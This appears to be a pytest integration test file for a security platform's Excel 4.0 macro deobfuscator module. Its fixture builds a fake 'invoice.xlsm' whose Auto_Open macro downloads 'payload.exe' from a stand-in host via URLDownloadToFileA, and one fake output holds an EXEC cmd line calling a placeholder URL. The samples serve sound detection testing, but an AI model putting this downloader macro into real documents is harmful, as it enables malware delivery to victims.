import logging
import os
import subprocess
import zipfile
from pathlib import Path

import pytest

from saq.analysis.root import load_root
from saq.configuration.config import get_analysis_module_config
from saq.constants import F_FILE, F_URL
from saq.engine.core import Engine
from saq.engine.enums import EngineExecutionMode
from saq.modules.file_analysis.xlm import XLMMacroDeobfuscatorAnalysis
from saq.modules.file_analysis.yara import YaraScanResults_v3_4
from saq.signatures.builtin import XLM_MACRO_URL
from saq.util.uuid import get_storage_dir

PAYLOAD_URL = "http://xlm.example.com/payload.exe"

CONTENT_TYPES = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
<Default Extension="xml" ContentType="application/xml"/>
<Override PartName="/xl/workbook.xml" ContentType="application/vnd.ms-excel.sheet.macroEnabled.main+xml"/>
<Override PartName="/xl/macrosheets/sheet1.xml" ContentType="application/vnd.ms-excel.macrosheet+xml"/>
</Types>"""

RELS = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/>
</Relationships>"""

WORKBOOK = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
<sheets><sheet name="Macro1" sheetId="1" r:id="rId1"/></sheets>
<definedNames><definedName name="_xlnm.Auto_Open">Macro1!$A$1</definedName></definedNames>
</workbook>"""

WORKBOOK_RELS = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.microsoft.com/office/2006/relationships/xlMacrosheet" Target="macrosheets/sheet1.xml"/>
</Relationships>"""

# an auto-open Excel 4.0 macro that downloads and saves a payload
MACROSHEET = f"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<xm:macrosheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:xm="http://schemas.microsoft.com/office/excel/2006/main">
<sheetData>
<row r="1"><c r="A1"><f>CALL("urlmon","URLDownloadToFileA","JJCCJJ",0,"{PAYLOAD_URL}","c:\\users\\public\\p.exe",0,0)</f></c></row>
<row r="2"><c r="A2"><f>HALT()</f></c></row>
</sheetData>
</xm:macrosheet>"""


def _xlsm(tmp_path: Path) -> Path:
    path = tmp_path / "invoice.xlsm"
    with zipfile.ZipFile(path, "w") as zip_fp:
        zip_fp.writestr("[Content_Types].xml", CONTENT_TYPES)
        zip_fp.writestr("_rels/.rels", RELS)
        zip_fp.writestr("xl/workbook.xml", WORKBOOK)
        zip_fp.writestr("xl/_rels/workbook.xml.rels", WORKBOOK_RELS)
        zip_fp.writestr("xl/macrosheets/sheet1.xml", MACROSHEET)
    return path


def _analyze(root_analysis, path: Path, yara_rules: tuple[str, ...] = ()):
    root_analysis.analysis_mode = "test_groups"
    file_observable = root_analysis.add_file_observable(str(path))
    if yara_rules:
        # what the yara scanner (a dependency of this module) found in the file
        yara_analysis = YaraScanResults_v3_4()
        file_observable.add_analysis(yara_analysis)
        yara_analysis.scan_results = [{"rule": rule} for rule in yara_rules]
    root_analysis.save()
    root_analysis.schedule()

    engine = Engine()
    engine.configuration_manager.enable_module("xlmdeobfuscator", "test_groups")
    engine.start_single_threaded(execution_mode=EngineExecutionMode.UNTIL_COMPLETE)

    root = load_root(get_storage_dir(root_analysis.uuid))
    file_observable = root.get_observable(file_observable.uuid)
    return file_observable, file_observable.get_and_load_analysis(XLMMacroDeobfuscatorAnalysis)


def _outputs(analysis):
    return {o.file_name: o for o in analysis.observables if o.type == F_FILE}


@pytest.fixture
def fake_xlmdeobfuscator(monkeypatch):
    """Replaces xlmdeobfuscator with a shell command per mode: set outputs["emulate"] and
    outputs["extract"] to (stdout, stderr), or to "hang"."""
    outputs = {}
    processes = []
    real_popen = subprocess.Popen

    def _popen(args, *a, **kw):
        if args[0] == "xlmdeobfuscator":
            output = outputs["extract" if "-x" in args else "emulate"]
            if output == "hang":
                command = ["sleep", "60"]
            else:
                stdout, stderr = output
                command = ["sh", "-c", 'printf "%s" "$0"; printf "%s" "$1" >&2', stdout, stderr]
            process = real_popen(command, *a, **kw)
            processes.append(process)
            return process
        return real_popen(args, *a, **kw)

    monkeypatch.setattr("saq.modules.file_analysis.xlm.Popen", _popen)
    outputs["processes"] = processes
    return outputs


@pytest.mark.integration
def test_deobfuscates_macro(root_analysis, tmp_path):
    file_observable, analysis = _analyze(root_analysis, _xlsm(tmp_path))

    assert analysis
    assert analysis.cell_count == 2
    assert analysis.summary == "XLMMacroDeobfuscator Analysis - analyzed 2 cells"
    assert file_observable.has_tag("xlm4")
    assert not file_observable.has_tag("xlm4:no_cells")

    outputs = _outputs(analysis)
    assert set(outputs) == {"xlmdeobfuscator.stdout", "xlmdeobfuscatorextractcells.stdout"}
    for output in outputs.values():
        assert output.has_directive("extract_urls")
        assert output.has_directive("crawl_extracted_urls")
        with open(output.full_path, "rb") as fp:
            # the banner is cut off
            assert fp.read().startswith(b"\nFile:")

    # the emulated cell's URL is its own parameter, not the rest of the parameter list
    urls = [o for o in analysis.observables if o.type == F_URL]
    assert [url.value for url in urls] == [PAYLOAD_URL]
    assert urls[0].has_directive("crawl")
    assert [d.signature_uuid for d in file_observable.detections] == [XLM_MACRO_URL.uuid]


@pytest.mark.integration
def test_ignores_files_without_xlm(root_analysis, tmp_path):
    path = tmp_path / "plain.xlsx"
    with zipfile.ZipFile(path, "w") as zip_fp:
        zip_fp.writestr("[Content_Types].xml", CONTENT_TYPES.replace("macrosheet", "worksheet"))

    _, analysis = _analyze(root_analysis, path)

    assert not analysis


@pytest.mark.integration
@pytest.mark.parametrize("rules, analyzed", [
    (("XLM_Macrosheet_NonBin",), True),
    (("Some_Other_Rule",), False),
])
def test_configured_yara_rules_trigger_analysis(root_analysis, tmp_path, fake_xlmdeobfuscator, rules, analyzed):
    """A file the module's own rules don't recognize is still analyzed when the yara scanner
    matched one of yara_rule_names."""
    fake_xlmdeobfuscator["emulate"] = ("", "")
    fake_xlmdeobfuscator["extract"] = ("\nFile: x\nCELL:A1, =HALT(), None\n", "")
    path = tmp_path / "book.xlsb"
    path.write_bytes(b"not something the module's rules match")

    _, analysis = _analyze(root_analysis, path, yara_rules=rules)

    assert bool(analysis) == analyzed


@pytest.mark.integration
def test_ignores_files_over_the_size_limit(root_analysis, tmp_path):
    get_analysis_module_config("xlmdeobfuscator").maximum_size_mb = 0

    _, analysis = _analyze(root_analysis, _xlsm(tmp_path))

    assert not analysis


@pytest.mark.integration
def test_no_cells(root_analysis, tmp_path, fake_xlmdeobfuscator):
    fake_xlmdeobfuscator["emulate"] = ("banner\nFile: x\n[END of Deobfuscation]\n", "")
    fake_xlmdeobfuscator["extract"] = ("banner\nFile: x\nError loading cells\n", "")

    file_observable, analysis = _analyze(root_analysis, _xlsm(tmp_path))

    assert analysis.cell_count == 0
    assert file_observable.has_tag("xlm4:no_cells")
    assert file_observable.has_tag("xlm4:error")
    assert not file_observable.detections


@pytest.mark.integration
def test_stderr_is_kept(root_analysis, tmp_path, fake_xlmdeobfuscator):
    fake_xlmdeobfuscator["emulate"] = ("", "emulation failed\n")
    fake_xlmdeobfuscator["extract"] = ("\nFile: x\nCELL:A1, =HALT(), None\n", "a warning\n")

    file_observable, analysis = _analyze(root_analysis, _xlsm(tmp_path))

    target_dir = f"{file_observable.full_path}.xlmdeobfuscator"
    with open(os.path.join(target_dir, "xlmdeobfuscator.stderr")) as fp:
        assert fp.read() == "emulation failed\n"
    with open(os.path.join(target_dir, "xlmdeobfuscatorextractcells.stderr")) as fp:
        assert fp.read() == "a warning\n"
    # nothing came out of the first pass
    assert set(_outputs(analysis)) == {"xlmdeobfuscatorextractcells.stdout"}
    assert analysis.cell_count == 1


@pytest.mark.integration
def test_output_that_is_not_utf8(root_analysis, tmp_path, fake_xlmdeobfuscator):
    fake_xlmdeobfuscator["emulate"] = (b'\nFile: x\nCELL:A1        , FullEvaluation      , EXEC("cmd \xff\xfe","https://bad.example.com/a")\n', "")
    fake_xlmdeobfuscator["extract"] = ("\nFile: x\nCELL:A1, =HALT(), None\n", "")

    file_observable, analysis = _analyze(root_analysis, _xlsm(tmp_path))

    assert analysis
    assert [o.value for o in analysis.observables if o.type == F_URL] == ["https://bad.example.com/a"]


@pytest.mark.integration
def test_encrypted_document(root_analysis, tmp_path, fake_xlmdeobfuscator):
    fake_xlmdeobfuscator["emulate"] = ("Failed to decrypt the file\nUse --password switch to provide the correct password", "")

    file_observable, analysis = _analyze(root_analysis, _xlsm(tmp_path))

    assert analysis
    assert not _outputs(analysis)
    # the second pass is skipped
    assert len(fake_xlmdeobfuscator["processes"]) == 1


@pytest.mark.integration
def test_timeout(root_analysis, tmp_path, fake_xlmdeobfuscator, caplog):
    get_analysis_module_config("xlmdeobfuscator").timeout = 1
    fake_xlmdeobfuscator["emulate"] = "hang"
    fake_xlmdeobfuscator["extract"] = "hang"

    file_observable, analysis = _analyze(root_analysis, _xlsm(tmp_path))

    assert file_observable.has_tag("xlmdeobfuscator_failed")
    assert file_observable.has_tag("xlmdeobfuscatorextractcells_failed")
    assert not _outputs(analysis)
    # killed and reaped
    assert [p.returncode for p in fake_xlmdeobfuscator["processes"]] == [-9, -9]
    assert sum(r.levelno == logging.WARNING and "timed out analyzing" in r.getMessage() for r in caplog.records) == 2
